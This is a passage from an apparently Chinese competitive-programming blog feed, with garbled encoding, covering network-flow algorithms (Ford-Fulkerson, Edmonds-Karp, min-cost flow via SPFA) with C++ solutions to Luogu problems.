class="line">    root[x]=cnt;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">bool</span> <span class="title">spfa</span><span class="params">()</span></span>&#123;</span><br><span class="line">    <span class="built_in">memset</span>(dis,<span class="number">0x3f</span>,<span class="built_in"><span class="keyword">sizeof</span></span>(dis));<span class="comment">//æœ€å¤§åˆå§‹åŒ–</span></span><br><span class="line">    dis[s]=<span class="number">0</span>;</span><br><span class="line">    q.<span class="built_in">push</span>(s);<span class="comment">//æºç‚¹å…¥é˜Ÿ</span></span><br><span class="line">    <span class="keyword">while</span>(!q.<span class="built_in">empty</span>())&#123;</span><br><span class="line">        <span class="keyword">int</span> u=q.<span class="built_in">front</span>();</span><br><span class="line">        q.<span class="built_in">pop</span>();</span><br><span class="line">        inque[u]=<span class="number">0</span>;</span><br><span class="line">        <span class="comment">//cout&lt;&lt;u&lt;&lt;endl;</span></span><br><span class="line">        <span class="keyword">for</span>(<span class="keyword">int</span> i=root[u];i;i=edge[i].next)&#123;</span><br><span class="line">            <span class="keyword">int</span> v=edge[i].to;</span><br><span class="line">            <span class="keyword">if</span>(!edge[i].w)<span class="keyword">continue</span>;<span class="comment">//å¦‚æœè¿™æ¡è¾¹æ²¡æœ‰æµé‡åˆ™è·³è¿‡</span></span><br><span class="line">            <span class="keyword">if</span>(dis[v]&gt;dis[u]+edge[i].d)&#123;<span class="comment">//ä¸‰è§’å½¢ä¸ç­‰å¼åˆ¤å®š</span></span><br><span class="line">                dis[v]=dis[u]+edge[i].d;</span><br><span class="line">                pre[v].v=u;<span class="comment">//è®°å½•è·¯å¾„</span></span><br><span class="line">                pre[v].edge=i;</span><br><span class="line">                <span class="keyword">if</span>(!inque[v])&#123;<span class="comment">//ç»å…¸spfa</span></span><br><span class="line">                    inque[v]=<span class="number">1</span>;</span><br><span class="line">                    q.<span class="built_in">push</span>(v);</span><br><span class="line">                &#125;</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;    </span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">return</span> dis[t]!=inf;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">EK</span><span class="params">()</span></span>&#123;</span><br><span class="line">    <span class="keyword">int</span> ans=<span class="number">0</span>,w=<span class="number">0</span>;</span><br><span class="line">    <span class="keyword">while</span>(<span class="built_in">spfa</span>())&#123;</span><br><span class="line">        <span class="keyword">int</span> k=inf;</span><br><span class="line">        <span class="keyword">int</span> f=<span class="number">0</span>;</span><br><span class="line">        <span class="keyword">for</span>(<span class="keyword">int</span> i=t;i!=s;i=pre[i].v)&#123;</span><br><span class="line">            k=<span class="built_in">min</span>(edge[pre[i].edge].w,k);<span class="comment">//è®¡ç®—æœ€å°æµé‡</span></span><br><span class="line">            f+=edge[pre[i].edge].d; <span class="comment">//ç»Ÿè®¡æ€»è´¹ç”¨</span></span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">for</span>(<span class="keyword">int</span> i=t;i!=s;i=pre[i].v)&#123;</span><br><span class="line">            edge[pre[i].edge].w-=k;<span class="comment">//æ­£å‘è¾¹æµé‡-</span></span><br><span class="line">            edge[pre[i].edge^<span class="number">1</span>].w+=k;<span class="comment">//åå‘è¾¹æµé‡+</span></span><br><span class="line">        &#125;</span><br><span class="line">        ans+=k;<span class="comment">//è®¡ç®—æµé‡</span></span><br><span class="line">        w+=k*f;<span class="comment">//è®¡ç®—è´¹ç”¨</span></span><br><span class="line">    &#125;</span><br><span class="line">    cout&lt;&lt;ans&lt;&lt;<span class="string">&#x27; &#x27;</span>&lt;&lt;w&lt;&lt;endl;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">sync</span><span class="params">()</span></span>&#123;</span><br><span class="line">    ios::<span class="built_in">sync_with_stdio</span>(<span class="number">0</span>);</span><br><span class="line">    cin.<span class="built_in">tie</span>(<span class="number">0</span>);</span><br><span class="line">    cout.<span class="built_in">tie</span>(<span class="number">0</span>);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">signed</span> <span class="title">main</span><span class="params">()</span></span>&#123;</span><br><span class="line">    <span class="comment">//freopen(&quot;P3381_8.in&quot;,&quot;r&quot;,stdin);</span></span><br><span class="line">    <span class="built_in">sync</span>();</span><br><span class="line">    cnt=<span class="number">1</span>;</span><br><span class="line">    cin&gt;&gt;n&gt;&gt;m&gt;&gt;s&gt;&gt;t;</span><br><span class="line">    <span class="keyword">while</span>(m--)&#123;</span><br><span class="line">        <span class="keyword">int</span> u,v,w,c;</span><br><span class="line">        cin&gt;&gt;u&gt;&gt;v&gt;&gt;w&gt;&gt;c;</span><br><span class="line">        <span class="built_in">add</span>(u,v,w,c);</span><br><span class="line">        <span class="built_in">add</span>(v,u,<span class="number">0</span>,-c);<span class="comment">//æ·»åŠ è´Ÿè´¹ç”¨çš„åå‘è¾¹</span></span><br><span class="line">    &#125;</span><br><span class="line">    <span class="built_in">EK</span>();</span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>]]></content>
      
      
      <categories>
          
          <category> icpc </category>
          
          <category> å›¾è®º </category>
          
          <category> ç½‘ç»œæµ </category>
          
      </categories>
      
      
    </entry>
    
    
    
    <entry>
      <title>ç½‘ç»œæµå­¦ä¹ ç¬”è®°</title>
      <link href="/2022/03/03/%E7%BD%91%E7%BB%9C%E6%B5%81%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0/"/>
      <url>/2022/03/03/%E7%BD%91%E7%BB%9C%E6%B5%81%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0/</url>
      
        <content type="html"><![CDATA[<p>æœ€è¿‘èŠ±ç‚¹æ—¶é—´çœ‹äº†çœ‹ç½‘ç»œæµï¼Œä¹Ÿæ·±åº¦åœ°å­¦ä¹ äº†ä¸€ä¸‹ç½‘ç»œæµçš„å„ä¸ªç®—æ³•ï¼Œè™½ç„¶è¿˜æœ‰ä¸€ä¸ªæ²¡å­¦ï¼Œä½†æ˜¯ä¸å½±å“ã€‚</p><span id="more"></span><h2 id="æ¦‚å¿µå¼•å…¥"><a href="#æ¦‚å¿µå¼•å…¥" class="headerlink" title="æ¦‚å¿µå¼•å…¥"></a>æ¦‚å¿µå¼•å…¥</h2><p>é¦–å…ˆæˆ‘ä»¬è¦å…ˆç†è§£ä¸€ä¸‹ä»€ä¹ˆæ˜¯ç½‘ç»œï¼Œç½‘ç»œä¸æœ‰å‘å›¾è™½ç„¶é•¿å¾—ä¸€æ¨¡ä¸€æ ·ï¼Œä½†æ˜¯æ¦‚å¿µç•¥å¾®ä¸ä¸€æ ·ï¼Œé¦–å…ˆç½‘ç»œçš„è¾¹æƒä¸ä»£è¡¨è·¯å¾„é•¿åº¦ï¼Œä»£è¡¨æµé‡æˆ–è€…èŠ±è´¹ã€‚</p><ol><li>æºç‚¹ï¼šå…¥è¯»ä¸º0çš„ç‚¹ï¼Œåªå‡ºä¸è¿›</li><li>æ±‡ç‚¹ï¼šå‡ºåº¦ä¸º0çš„ç‚¹ï¼Œåªè¿›ä¸å‡º</li></ol><p>åœ¨ç½‘ç»œä¸­ï¼Œå¯¹äºéæºç‚¹å’Œæ±‡ç‚¹çš„æ‰€æœ‰ç‚¹ï¼Œéœ€è¦æ»¡è¶³æµå…¥æµé‡ä¹‹å’Œç­‰äºæµå‡ºæµé‡ä¹‹å’Œï¼Œä¸­é—´èŠ‚ç‚¹ä¸å­˜å‚¨ä»»ä½•æµé‡ï¼Œä»»ä½•ä¸€æ¡è¾¹çš„æµé‡å—é™äºè‡ªå·±çš„å®¹é‡é™åˆ¶ã€‚</p><p>äºæ˜¯æœ‰çš„äººå°±æƒ³è¦æ±‚å‡ºï¼šè¿™å¼ ç½‘ç»œè¿ä½œèµ·æ¥çš„æ—¶å€™ï¼Œæ€»æµé‡æœ€å¤§èƒ½æœ‰å¤šå°‘ã€‚ç”±äºå®¹é‡é™åˆ¶æ¯”è¾ƒå¤æ‚ï¼Œä¼¼ä¹ä¸å®¹æ˜“è§„åˆ’ä¸€ä¸ªæœ€ä½³æ–¹æ¡ˆã€‚</p><p>such as:</p><p><img src="/2022/03/03/%E7%BD%91%E7%BB%9C%E6%B5%81%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0/1.png" alt="1"></p><p>åœ¨è¿™é‡Œï¼Œå¾ˆå®¹æ˜“å¾—å‡º $s\to t$ çš„æœ€å¤§æµé‡å°±æ˜¯2ï¼Œä¸Šé¢ä¸€æ¡è·¯ï¼Œä¸‹é¢ä¸€æ¡è·¯ï¼Œè¾¹ä¸Šçš„é™åˆ¶éƒ½æ˜¯1ï¼Œå› æ­¤æ€»æµé‡ä¸º2ã€‚è¿™é‡Œæˆ‘ä»¬å†ç»™å‡ºä¸¤ä¸ªæ¦‚å¿µï¼š</p><ol><li>å¢å¹¿ :åœ¨ç°æœ‰æµé‡åŸºç¡€ä¸Šå‘ç°æ–°çš„è·¯å¾„,æ‰©å¤§å‘ç°çš„æœ€å¤§æµé‡(<strong>æ³¨æ„</strong>:å¢åŠ é‡ä¸ä¸€å®šæ˜¯è¿™æ¡è·¯å¾„çš„æµé‡,è€Œæ˜¯æ–°çš„æµé‡ä¸ä¸Šæ¬¡æµé‡ä¹‹å·®)</li><li>å¢å¹¿è·¯:åœ¨ç°æœ‰æµé‡åŸºç¡€ä¸Šå‘ç°çš„æ–°è·¯å¾„.(å¿«æ¥æ‰¾èŒ¬,å’Œä¸Šä¸€æ¡æœ‰ä½•ä¸åŒ?)</li></ol><p>å› æ­¤æˆ‘ä»¬æœ‰äº†ç¬¬ä¸€ä¸ªç®—æ³•ï¼šFFã€‚</p><p>è™½ç„¶ä¸€èˆ¬æ¥è¯´åŸºæœ¬é€šä¸è¿‡æµ‹è¯•ç‚¹ï¼Œä½†æ˜¯è¿˜æ˜¯æœ‰å¿…è¦å­¦çš„ã€‚</p><h2 id="FFç®—æ³•"><a href="#FFç®—æ³•" class="headerlink" title="FFç®—æ³•"></a>FFç®—æ³•</h2><p>ä»æºç‚¹å¼€å§‹å¯»æ‰¾å¢å¹¿è·¯ï¼Œå¦‚è¿‡æ‰¾åˆ°é‚£ä¹ˆæ•´æ¡è·¯å¾„çš„æµé‡å‡å»æ•´ä¸ªè·¯å¾„ä¸Šçš„æœ€å°æµé‡ï¼Œç„¶åé‡å¤å¯»æ‰¾å¢å¹¿è·¯ï¼Œç›´åˆ°æ‰¾ä¸åˆ°å¢å¹¿è·¯ä¸ºæ­¢ï¼Œæœ€å¤§æµå³æ˜¯æ¯æ¬¡å¢å¹¿è·¯å‡å°‘çš„æµé‡çš„å’Œï¼Œè¿™ä¸ªç»“è®ºæ˜¯å¾ˆå®¹æ˜“è¯æ˜çš„ï¼Œæ‰€ä»¥å’±å°±ä¸è¯äº†ã€‚</p><p>å¾ˆæœ‰å¹¸ï¼Œå’±è¿˜æ˜¯å†™è¿‡äº†è¿™ä¸ªç®—æ³•ï¼Œæ¯æ¬¡ $\text{dfs}$ å¾—åˆ°ä¸€ä¸ªå¢å¹¿è·¯ï¼Œè¿™ä¸ªç®—æ³•è¿‡å¾—äº†å›¾ä¸ºæ ‘æ—¶å€™çš„æœ€å¤§æµï¼Œä½†æ˜¯è¿‡ä¸å»æ ‡æ¿ï¼Œæ ‡æ¿çš„æ•°æ®é‡æ‰200ä¸ªç‚¹ï¼Œè¿˜èƒ½ TLE å¾ˆå¤šç‚¹ã€‚</p><p>ä½†æ˜¯æœ‰ä¸€ä¸ªé—®é¢˜ï¼Œå¦‚æœæˆ‘ä¸€å¼€å§‹èµ°äº†é”™è¯¯çš„è·¯çº¿ï¼Œæ¯”å¦‚ä¸Šé¢çš„å›¾ä¸­ï¼Œå‡å¦‚æˆ‘èµ°äº†ä¸­é—´é‚£æ¡è·¯ï¼Œé‚£ä¹ˆå°±ä¼šå¯¼è‡´æ¥ä¸‹æ¥æ‰¾ä¸åˆ°å¢å¹¿è·¯äº†ï¼Œæ‰€ä»¥æˆ‘ä»¬åœ¨èµ°çš„æ—¶å€™ä¼šå¢åŠ åæ‚”åŠŸèƒ½ï¼Œè¿™æ¡åå‘è¾¹å°±æ˜¯é˜²æ­¢èµ°äº†é”™è¯¯è·¯çº¿ç»™ä½ åæ‚”ç”¨çš„ï¼Œå‡è®¾ä½ èµ°äº† $s\to a \to b\to t$ ï¼Œé‚£ä¹ˆæ­¤æ—¶å›¾å˜æˆè¿™æ ·ï¼š</p><p><img src="/2022/03/03/%E7%BD%91%E7%BB%9C%E6%B5%81%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0/2.png" alt="2"></p><p>é‚£ä¹ˆåœ¨å¾€ä¸‹èµ°çš„è¿‡ç¨‹ä¸­æˆ‘å°±èƒ½ç»è¿‡ $s \to b\to a\to t$ï¼Œç„¶ååˆ°è¾¾æ±‡ç‚¹ã€‚ä¸­é—´è¿™æ¡è¾¹ç»è¿‡ä¸¤æ¬¡ï¼Œå˜å›ä¸€å¼€å§‹çš„æ ·å­ï¼Œç›¸å½“äºå°±æ˜¯æ²¡èµ°ï¼Œè¿™ä¸ªåå‘è¾¹æ·»åŠ åœ¨æ‰€æœ‰çš„ç½‘ç»œæµç®—æ³•éƒ½ä¼šç”¨åˆ°ï¼Œå› æ­¤ä¸€å®šè¦ç†è§£ã€‚</p><p>è¿™é‡Œç»™å‡ºç»ƒä¹ è¿™ä¸ªç®—æ³•çš„æ¿å­å§â€”â€”<a href="https://www.luogu.com.cn/problem/P3931">P3931</a></p><p>æˆ‘å†™çš„ç¨‹åº</p><figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="meta-keyword">include</span><span class="meta-string">&lt;bits/stdc++.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> maxn 100005</span></span><br><span class="line"><span class="keyword">using</span> <span class="keyword">namespace</span> std;</span><br><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">eee</span>&#123;</span></span><br><span class="line">    <span class="keyword">int</span> next;</span><br><span class="line">    <span class="keyword">int</span> to;</span><br><span class="line">    <span class="keyword">int</span> w;</span><br><span class="line">&#125;edge[maxn&lt;&lt;<span class="number">1</span>];</span><br><span class="line"><span class="keyword">int</span> r,n,cnt=<span class="number">1</span>,root[maxn],fa[maxn],dest[maxn];</span><br><span class="line">stack&lt;<span class="keyword">int</span>&gt;path;</span><br><span class="line"><span class="function"><span class="keyword">inline</span> <span class="keyword">void</span> <span class="title">add</span><span class="params">(<span class="keyword">int</span> x,<span class="keyword">int</span> y,<span class="keyword">int</span> w)</span></span>&#123;</span><br><span class="line">    edge[++cnt]=&#123;root[x],y,w&#125;;</span><br><span class="line">    root[x]=cnt;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">dfs</span><span class="params">(<span class="keyword">int</span> u)</span></span>&#123;</span><br><span class="line">    <span class="keyword">for</span>(<span class="keyword">int</span> i=root[u];i;i=edge[i].next)&#123;</span><br><span class="line">        <span class="keyword">int</span> to=edge[i].to;</span><br><span class="line">        <span class="keyword">if</span>(fa[u]==to)<span class="keyword">continue</span>;</span><br><span class="line">        fa[to]=u;</span><br><span class="line">        <span class="comment">//edge[i^1].w=0;</span></span><br><span class="line">        <span class="built_in">dfs</span>(to);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">if</span>(!edge[root[u]].next&amp;&amp;u!=r)&#123;</span><br><span class="line">        dest[u]=<span class="number">1</span>;</span><br><span class="line">    &#125; </span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">find_path</span><span class="params">(<span class="keyword">int</span> now,<span class="keyword">int</span> from,<span class="keyword">int</span> flow)</span></span>&#123;</span><br><span class="line">    <span class="keyword">if</span>(dest[now])<span class="keyword">return</span> flow;</span><br><span class="line">    <span class="keyword">int</span> qw=<span class="number">0</span>;</span><br><span class="line">    <span class="keyword">for</span>(<span class="keyword">int</span> i=root[now];i;i=edge[i].next)&#123;</span><br><span class="line">        <span class="keyword">int</span> to=edge[i].to,w=edge[i].w;</span><br><span class="line">        </span><br><span class="line">        <span class="comment">//printf(&quot;to is %d w is %d\n&quot;,to,w);</span></span><br><span class="line">        <span class="keyword">if</span>(to==from)<span class="keyword">continue</span>;</span><br><span class="line">        <span class="keyword">if</span>(w==<span class="number">0</span>)<span class="keyword">continue</span>;</span><br><span class="line">        path.<span class="built_in">push</span>(i);</span><br><span class="line">        qw=<span class="built_in">find_path</span>(to,now,<span class="built_in">min</span>(flow,w));</span><br><span class="line">        <span class="keyword">if</span>(qw==<span class="number">0</span>)<span class="keyword">continue</span>;</span><br><span class="line">        <span class="keyword">break</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">return</span> qw;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">maxflow</span><span class="params">()</span></span>&#123;</span><br><span class="line">    <span class="keyword">int</span> ans=<span class="number">0</span>;</span><br><span class="line">    <span class="keyword">while</span>(<span class="number">1</span>)&#123;</span><br><span class="line"></span><br><span class="line">        <span class="keyword">int</span> l=<span class="built_in">find_path</span>(r,<span class="number">0</span>,<span class="number">0x7fffffff</span>);</span><br><span class="line">        <span class="keyword">if</span>(l!=<span class="number">0</span>&amp;&amp;l!=<span class="number">0x7fffffff</span>)&#123;</span><br><span class="line">            ans+=l;</span><br><span class="line">            <span class="keyword">while</span>(path.<span class="built_in">size</span>())&#123;</span><br><span class="line">                <span class="keyword">int</span> e=path.<span class="built_in">top</span>();</span><br><span class="line">                path.<span class="built_in">pop</span>();</span><br><span class="line">                edge[e].w-=l;</span><br><span class="line">                edge[e^<span class="number">1</span>].w+=l; </span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">else</span>&#123;</span><br><span class="line">            <span class="keyword">break</span>;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="comment">//printf(&quot;ans=%d\n&quot;,ans);</span></span><br><span class="line">    &#125;</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;%d\n&quot;</span>,ans);</span><br><span class="line">&#125;</span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">main</span><span class="params">()</span></span>&#123;</span><br><span class="line">    <span class="comment">//freopen(&quot;P3931_2.in&quot;,&quot;r&quot;,stdin);</span></span><br><span class="line">    cin&gt;&gt;n&gt;&gt;r;</span><br><span class="line">    <span class="keyword">for</span>(<span class="keyword">int</span> i=<span class="number">1</span>;i&lt;n;i++)&#123;</span><br><span class="line">        <span class="keyword">int</span> x,y,w;</span><br><span class="line">        cin&gt;&gt;x&gt;&gt;y&gt;&gt;w;</span><br><span class="line">        <span class="built_in">add</span>(x,y,w);</span><br><span class="line">        <span class="built_in">add</span>(y,x,w);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="built_in">dfs</span>(r);</span><br><span class="line">    <span class="built_in">maxflow</span>();</span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>è¿™ä¸ªæ•°æ®é‡ $\text{10w}$ éƒ½èƒ½è¿‡ä¸ºå•¥èƒ½è¿‡å‘¢ï¼Œæ®è¯„è®ºåŒºå¤§ä½¬è¯´ï¼Œå› ä¸ºæ ‘æ˜¯äºŒåˆ†å›¾ï¼Œå› æ­¤å¢å¹¿è·¯ä¸ä¼šè¶…è¿‡ $log_2n$ æ¡ï¼Œå› æ­¤è¿™é¢˜æˆ‘è¿™ä¹ˆå†™èƒ½è¿‡ï¼Œä½†æ˜¯é‡åˆ°éæ ‘çš„æ¯’ç˜¤å›¾é‚£çœŸçš„ $200$ éƒ½èƒ½å¡ä½çš„ï¼Œè€Œä¸”æˆ‘ä¸‹äº†ä¸€ä¸‹æ ‡æ¿çš„æµ‹è¯•ç‚¹ï¼Œè²Œä¼¼å°±æ˜¯ä¼šé™·å…¥æ­»å¾ªç¯ï¼Œæˆ‘ä¸çŸ¥é“å“ªé‡Œå†™å‡ºæ¥çš„é—®é¢˜äº†ã€‚</p><h2 id="EKç®—æ³•"><a href="#EKç®—æ³•" class="headerlink" title="EKç®—æ³•"></a>EKç®—æ³•</h2><p>åœ¨é«˜ä¸­çš„æ—¶å€™æˆ‘ä»¬è€å¸ˆå°±è®²è¿‡ï¼Œåœ¨ä¸€èˆ¬æƒ…å†µä¸‹ï¼Œ$\text{dfs}$ ä¸€å®šæ˜¯æ²¡æœ‰ $\text{bfs}$ ä¼˜çš„ã€‚å› æ­¤æˆ‘ä»¬æ¯æ¬¡éƒ½æŒ‘ä¸€ä¸ªçœ‹ä¸Šå»è·¯å¾„æœ€çŸ­çš„å¢å¹¿è·¯ï¼Œæ—¢ç„¶è¦æ±‚æœ€çŸ­äº†æˆ‘ä»¬å°±å¯ä»¥ç”¨ $\text{bfs}$ å»å¯»æ‰¾å¢å¹¿è·¯äº†ã€‚</p><p>EKç®—æ³•å¯ä»¥é€šè¿‡æ ‡æ¿â€”â€”<a href="https://www.luogu.com.cn/problem/P3376">P3376</a></p><p>æˆ‘å†™çš„ç¨‹åº</p><figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="meta-keyword">include</span><span class="meta-string">&lt;bits/stdc++.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> int long long</span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> maxn 500</span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> inf 0x3f3f3f3f3f3f3f3f</span></span><br><span class="line"><span class="keyword">using</span> <span class="keyword">namespace</span> std;</span><br><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">eee</span>&#123;</span></span><br><span class="line">    <span class="keyword">int</span> to;</span><br><span class="line">    <span class="keyword">int</span> w;</span><br><span class="line">    <span class="keyword">int</span> next;</span><br><span class="line">&#125;edge[<span class="number">5005</span>&lt;&lt;<span class="number">1</span>];</span><br><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">ee</span>&#123;</span></span><br><span class="line">    <span class="keyword">int</span> v;</span><br><span class="line">    <span class="keyword">int</span> edge;</span><br><span class="line">&#125;pre[<span class="number">5005</span>&lt;&lt;<span class="number">1</span>];</span><br><span class="line"></span><br><span class="line"><span class="keyword">int</span> root[maxn],inque[maxn],cnt=<span class="number">1</span>;</span><br><span class="line"><span class="keyword">int</span> n,m,s,t;</span><br><span class="line"><span class="function"><span class="keyword">inline</span> <span class="keyword">void</span> <span class="title">add</span><span class="params">(<span class="keyword">int</span> x,<span class="keyword">int</span> y,<span class="keyword">int</span> w)</span></span>&#123;</span><br><span class="line">    edge[++cnt]=&#123;y,w,root[x]&#125;;</span><br><span class="line">    root[x]=cnt;</span><br><span class="line">&#125;</span><br><span class="line"><span class="function"><span class="keyword">bool</span> <span class="title">bfs</span><span class="params">()</span></span>&#123;</span><br><span class="line">    queue&lt;<span class="keyword">int</span>&gt;q;</span><br><span class="line">    <span class="built_in">memset</span>(inque,<span class="number">0</span>,<span class="built_in"><span class="keyword">sizeof</span></span>(inque));</span><br><span class="line">    <span class="built_in">memset</span>(pre,<span class="number">0xff</span>,<span class="built_in"><span class="keyword">sizeof</span></span>(pre));</span><br><span class="line">    inque[s]=<span class="number">1</span>;</span><br><span class="line">    q.<span class="built_in">push</span>(s);</span><br><span class="line">    <span class="keyword">while</span>(q.<span class="built_in">size</span>())&#123;</span><br><span class="line">        <span class="keyword">int</span> u=q.<span class="built_in">front</span>();</span><br><span class="line">        q.<span class="built_in">pop</span>();</span><br><span class="line">        <span class="keyword">for</span>(<span class="keyword">int</span> i=root[u];i;i=edge[i].next)&#123;</span><br><span class="line">            <span class="keyword">int</span> v=edge[i].to;</span><br><span class="line">            <span class="keyword">if</span>(!inque[v]&amp;&amp;edge[i].w)&#123;</span><br><span class="line">                pre[v]=&#123;u,i&#125;;</span><br><span class="line">                <span class="keyword">if</span>(v==t)&#123;</span><br><span class="line">                    <span class="keyword">return</span> <span class="number">1</span>;</span><br><span class="line">                &#125; </span><br><span class="line">                inque[v]=<span class="number">1</span>;</span><br><span class="line">                q.<span class="built_in">push</span>(v);</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">        </span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">EK</span><span class="params">()</span></span>&#123;</span><br><span class="line">    <span class="keyword">long</span> <span class="keyword">long</span> ans=<span class="number">0</span>;</span><br><span class="line">    <span class="comment">//printf(&quot;%lld\n&quot;,sizeof(ans));</span></span><br><span class="line">    <span class="keyword">while</span>(<span class="built_in">bfs</span>())&#123;</span><br><span class="line">        <span class="keyword">long</span> <span class="keyword">long</span> mi=inf;</span><br><span class="line">        <span class="keyword">for</span>(<span class="keyword">int</span> i=t;i!=s;i=pre[i].v)&#123;</span><br><span class="line">            mi=<span class="built_in">min</span>(mi,edge[pre[i].edge].w);</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">for</span>(<span class="keyword">int</span> i=t;i!=s;i=pre[i].v)&#123;</span><br><span class="line">            edge[pre[i].edge].w-=mi;</span><br><span class="line">            edge[pre[i].edge^<span class="number">1</span>].w+=mi;</span><br><span class="line">        &#125;</span><br><span class="line">        ans+=mi;</span><br><span class="line">        </span><br><span class="line">    &#125;</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;%lld\n&quot;</span>,ans);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">sync</span><span class="params">()</span></span>&#123;</span><br><span class="line">    ios::<span class="built_in">sync_with_stdio</span>(<span class="number">0</span>);</span><br><span class="line">    cin.<span class="built_in">tie</span>(<span class="number">0</span>);</span><br><span class="line">    cout.<span 